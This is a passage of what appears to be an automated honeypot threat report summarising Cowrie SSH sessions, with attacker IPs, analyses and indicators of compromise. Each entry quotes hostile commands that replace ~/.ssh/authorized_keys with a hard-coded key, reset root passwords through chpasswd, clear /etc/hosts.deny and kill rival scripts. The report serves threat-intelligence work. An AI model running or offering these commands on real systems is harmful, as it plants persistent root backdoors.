Enter new UNIX password:
echo "yuxiang\nbNSKbfZ8PGdx\nbNSKbfZ8PGdx\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: fb83d99b322c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.83.162.167

#### Analysis

**Attack Type:** Backdoor installation / remote access  
**Objective:** Gain persistent remote control via SSH and root privileges.  
**Techniques:**  
- Injected a public SSH key into `~/.ssh/authorized_keys` (chattr & lockr to protect the directory).  
- Set the root password with `chpasswd`.  
- Cleared temporary scripts (`secure.sh`, `auth.sh`) and killed related processes.  
- Removed host restrictions by emptying `/etc/hosts.deny`.  
- Gathered system info (CPU, memory, OS details) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **202.83.162.167** (Pakistan).  
- Public

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:p8dIAtayYiHH"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 62c07c11fbe7...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 4.213.161.168

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Gain SSH access to the host and potentially use it for further malicious activity.  

**Techniques Used:**  
- Manipulation of `.ssh` directory (chmod, lockr, chattr) to secure the key file.  
- Injection of a public‑key into `authorized_keys`.  
- Attempted password changes via `passwd` with echo input.  
- System reconnaissance commands (`cpuinfo`, `free`, `uname`, `top`, etc.) to gather host details.

**Indicators of Compromise (IOCs):**  
- Attacker IP: **4.213.161.168**  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `~/.ssh/authorized_keys`

**Threat Level:** Medium–High (backdoor installation with potential for remote exploitation).  

**Brief Summary:** The attacker injected an SSH key into the host’s authorized‑keys file, attempted to alter passwords, and collected system information—likely establishing a backdoor for future malicious use.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "12345\nh6gXFH4mTRCm\nh6gXFH4mTRCm"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "12345\nh6gXFH4mTRCm\nh6gXFH4mTRCm\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 0704012bf9bc...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 186.30.115.187

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection)

**Objective:** Gain persistent remote access to the system via SSH.

**Techniques Used:**
- Creation of `.ssh` directory, removal of existing keys, and insertion of a hard‑coded RSA public key.
- Modification of file permissions (`chmod -R go= ~/.ssh`) to restrict access.
- Password alteration using `passwd` with echoed credentials (attempts to set a new user password).

**Indicators of Compromise (IOCs):**
- Attacker IP: **186.30.115.187**  
- Hard‑coded SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File path: `~/.ssh/authorized_keys`

**Threat Level:** **High** – the attacker has established a persistent remote access mechanism and potentially altered user credentials.

**Brief Summary:** The attacker injected an SSH public key into the system’s authorized keys, removed existing keys, set restrictive permissions, and attempted to change the local password, thereby creating a backdoor for remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "leo123\nji8FsJu92mYM\nji8FsJu92mYM"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "leo123\nji8FsJu92mYM\nji8FsJu92mYM\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 36d0bfeff60e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.194.50

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent root access via SSH and local shell privileges.  

**Techniques & Tools Used:**  
- **SSH Key Injection** – created a new RSA key in `~/.ssh/authorized_keys`.  
- **Root Password Reset** – used `chpasswd` to set a hard‑coded root password (`root:7xRTZJsuLvZg`).  
- **Permission Manipulation** – changed permissions on the SSH directory (`chmod -R go= ~/.ssh`).  
- **Process Termination** – killed temporary scripts and sleep processes (`pkill -9 …`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: `45.78.194.50`  
- RSA key string in the authorized_keys file (the long base‑64 sequence).  
- File names: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`.  

**Threat Level:** **High** – attacker achieved root access and SSH backdoor, enabling full system control.  

**Brief Summary:** The session shows a malicious actor installing an SSH backdoor by injecting a new RSA key, resetting the root password, and securing permissions, thereby gaining unrestricted access to the host.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:7xRTZJsuLvZg"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc -l
top
... (+5 more)
```

---

### Pattern: 9569cc1fc9e3...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 105.27.148.94

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection combined with reconnaissance.

**2. Objective:**  
The attacker aims to gain remote access by adding a malicious SSH public key to the host’s `authorized_keys` and potentially create or modify a user account (`wpuser`) for future exploitation, while collecting system information (CPU, memory, disk) to assess the target environment.

**3. Techniques & Tools Used:**
- **SSH Key Injection:** `echo ... > .ssh/authorized_keys` with a hard‑coded RSA key.
- **File attribute manipulation:** `chattr -ia .ssh; lockr -ia .ssh` (likely used to hide or protect the file).
- **Password manipulation:** `passwd` commands attempting to set a new password for user `wpuser`.
- **System reconnaissance:** Commands such as `cat /proc/cpuinfo`, `free -m`, `df -h`, `uname`, `whoami`, `lscpu`, and `top`.

**4. Indicators of Compromise (IOCs):

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "wpuser\noiXgZ3uua89i\noiXgZ3uua89i"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "wpuser\noiXgZ3uua89i\noiXgZ3uua89i\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: c049f41ff57f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 83.229.122.23

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain remote access via SSH by injecting a malicious public‑key and attempting to alter the local user’s password; gather system information for reconnaissance.  

**Techniques & Tools:**
- `chattr`, `lockr` – file attribute manipulation (likely to hide or lock files).  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA key.  
- `chmod -R go= ~/.ssh` – restrict permissions on SSH directory.  
- `passwd` via echo piped input – attempt to set a new password for user “wpuser”.  
- System info commands (`cat /proc/cpuinfo`, `free`, `uname`, `lscpu`, `df`) – gathering hardware and OS details.

**Indicators of Compromise (IOCs):**
- Attacker IP: **83.229.122.23** (Hong Kong).  
- SSH public key string: `ssh‑rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`.  
- File paths: `.ssh/authorized_keys`, `.ssh` directory.  

**Threat Level:** **High** – the attacker successfully installed a backdoor and attempted to modify user credentials, potentially enabling persistent remote control.

**Brief Summary:** The session shows an attacker injecting a malicious SSH key into the honeypot’s `~/.ssh/authorized_keys`, attempting to change a local user password, and collecting system information for reconnaissance. This indicates a high‑risk backdoor installation aimed at establishing persistent remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "wpuser\nEyZ4iDYw6Umo\nEyZ4iDYw6Umo"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "wpuser\nEyZ4iDYw6Umo\nEyZ4iDYw6Umo\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 101433d13336...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 89.216.92.113

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent remote access via SSH with a new public key and root password.  

**Techniques & Tools Used:**  
- `chattr`/`lockr` to set immutable attributes on `.ssh`.  
- Creation of `/home/.ssh/authorized_keys` containing a hard‑coded RSA key.  
- `chpasswd` to change the root password (`root:daPJsiFAL3Dm`).  
- Process termination (`pkill -9`) and clearing `/etc/hosts.deny`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **89.216.92.113** (Serbia).  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`.  

**Threat Level:** **High** – root access and SSH key injection provide full control over the system.  

**Brief Summary:**  
The attacker injected a hard‑coded SSH key into `/home/.ssh/authorized_keys` and set a new root password, effectively installing a backdoor that allows remote privileged access to the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:daPJsiFAL3Dm"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 5bef1e9128a6...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 14.18.113.233

#### Analysis

**Attack Type:** Backdoor installation & reconnaissance  
**Objective:** Gain persistent SSH access and elevate privileges (root password) while gathering system information for future exploitation.  

**Techniques:**  
- **SSH key injection**: `echo "ssh-rsa …" > ~/.ssh/authorized_keys`  
- **Permission manipulation**: `chmod -R go= ~/.ssh`  
- **Root password reset**: `echo "root:zeXBTCP4EOBo"|chpasswd|bash`  
- **Process termination**: `pkill -9 secure.sh; pkill -9 auth.sh; pkill -9 sleep`  
- **System reconnaissance**: CPU, memory, disk usage, crontab, uname, whoami, lscpu.  

**Indicators of Compromise (IOCs):**  
- IP: 14.18.113.233 (China)  
- RSA public key string in `authorized_keys`: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File names: `.ssh/authorized_keys`, `secure.sh`, `auth.sh`.  

**Threat Level:** **High** – attacker has gained root access and installed a backdoor, enabling persistent compromise.  

**Brief Summary:** The attacker injected an SSH key and reset the root password to establish a permanent backdoor while collecting system metrics for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:zeXBTCP4EOBo"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 1cfcf69325b8...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 43.128.149.159

#### Analysis

**1. Attack Type:**  
Backdoor installation / remote access via SSH

**2. Objective:**  
Gain persistent, privileged remote access to the system (root account) by adding an SSH key and resetting the root password.

**3. Techniques & Tools Used:**
- **SSH Key Injection:** `echo "ssh-rsa …" >> .ssh/authorized_keys`
- **Root Password Reset:** `echo "root:uVV6sCGBbHNp"|chpasswd|bash`
- **Permission Manipulation:** `chmod -R go= ~/.ssh` and `lockr -ia .ssh`
- **Process Killing & Cleanup:** `pkill -9 secure.sh; pkill -9 auth.sh; pkill -9 sleep; rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh`
- **System Information Gathering** (e.g., CPU, memory, uptime) to possibly identify system characteristics.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: `43.128.149.159`  
- RSA SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `.ssh/authorized_keys`  

**5. Threat Level:** **High** – the attacker has achieved root-level access and installed a persistent backdoor.

**6. Brief Summary:**  
The attacker injected an SSH key into the system’s authorized keys, reset the root password, and manipulated permissions to establish a permanent remote access point, effectively installing a backdoor on the host.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:uVV6sCGBbHNp"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 64e96f9d49aa...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 201.184.50.251

#### Analysis

**Attack Type:** Backdoor installation (remote access via SSH)

**Objective:** Gain persistent, privileged access to the honeypot by adding an SSH key and resetting the root password.

**Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`)  
- Injection of a public‑key into `authorized_keys`  
- Password change via `chpasswd`  
- Process termination (`pkill -9`) and removal of temporary scripts  
- System reconnaissance commands (CPU, memory, filesystem, crontab, etc.)

**Indicators of Compromise (IOCs):**
- Attacker IP: **201.184.50.251**  
- SSH public key string in `authorized_keys` (the long RSA key)  
- Root password hash “ZAJSD7riQHt2” (used via `chpasswd`)  

**Threat Level:** Medium‑High – the attacker has root privileges and a persistent backdoor, enabling full control of the system.

**Brief Summary:** The attacker installed an SSH key and reset the root password to establish a permanent remote access point while collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ZAJSD7riQHt2"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 18d0a6f62e41...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 201.76.120.30

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential theft (remote access via SSH)

**2. Objective:**  
Gain persistent, privileged remote access on the target system by adding a malicious SSH key and resetting the root password.

**3. Techniques & Tools Used:**
- `chattr -ia` & `lockr -ia` to lock files
- Creation of `.ssh/authorized_keys` with an injected RSA public key
- `chmod -R go= ~/.ssh` to restrict permissions
- `echo "root:nMgsnLThkmQb"|chpasswd|bash` to change root password
- Process killing (`pkill -9`) and disabling services (`sleep`)
- Modifying `/etc/hosts.deny` to block unwanted connections
- System reconnaissance commands (CPU, memory, disk usage)

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **201.76.120.30**  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File names: `.ssh`, `authorized_keys`, `/etc/hosts.deny`

**5. Threat Level:** **High** – the attacker has achieved privileged access and installed a persistent backdoor.

**6. Summary:**  
The attacker injected an SSH key into the target’s `.ssh/authorized_keys` and reset the root password, establishing a high‑privilege remote backdoor while also disabling certain services and gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:nMgsnLThkmQb"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 99b4d9c44189...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 162.223.91.130

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root password reset) with reconnaissance  
**Objective:** Gain persistent remote access by adding an authorized SSH key and changing the root password; gather system information for further exploitation.  
**Techniques:**  
- Manipulate `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`) to hide/secure it.  
- Inject a public‑key into `authorized_keys`.  
- Change root password via `echo | chpasswd`.  
- Kill suspicious processes (`pkill -9`).  
- Gather system info (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, etc.).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **162.223.91.130**  
- Injected RSA key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File names: `.ssh/authorized_keys`, `/etc/hosts.deny`.  

**Threat Level:** **High** – root password change and SSH key injection provide full privileged access.  
**Brief Summary:** The attacker installed a backdoor by injecting an SSH key into the honeypot’s authorized keys, reset the root password, and performed system reconnaissance to prepare for further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:WircnmWf9Bcg"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 0b8bf9183af3...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 89.152.83.202

#### Analysis

**Attack Type:** Backdoor installation – the attacker is attempting to establish persistent remote access via SSH.

**Objective:** Gain root-level control on the system by injecting an SSH public‑key into `authorized_keys` and setting a new root password.

**Techniques:**
- Use of immutable file attributes (`chattr -ia`, `lockr`) to protect the `.ssh` directory.
- Creation of a custom SSH key and writing it to `/home/.ssh/authorized_keys`.
- Setting the root password with `chpasswd`.
- Permission tightening (`chmod -R go= ~/.ssh`).
- Clearing `/etc/hosts.deny` to remove host‑deny restrictions.

**Indicators of Compromise (IOCs):**
- Attacker IP: **89.152.83.202** (Portugal)
- Public key string in the command:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`
- File modifications: `/home/.ssh/authorized_keys`, `/etc/hosts.deny`.

**Threat Level:** Medium – the attacker demonstrates moderate sophistication (immutable file protection, root password change) but lacks advanced payload delivery or persistence mechanisms beyond SSH.

**Brief Summary:** The attacker injected an SSH key and set a new root password on the honeypot to establish remote access, indicating a backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ghmgcIl2IJIL"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 1a952f19d04a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 104.208.108.166

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain remote access via SSH by injecting a malicious public‑key into the host’s `authorized_keys` file, while gathering basic system information for reconnaissance.  

**Techniques Used:**
- **File manipulation & hiding** – `chattr -ia`, `lockr -ia` to make `.ssh` immutable and hidden.
- **SSH key injection** – `echo … > .ssh/authorized_keys` with a hard‑coded RSA public key.
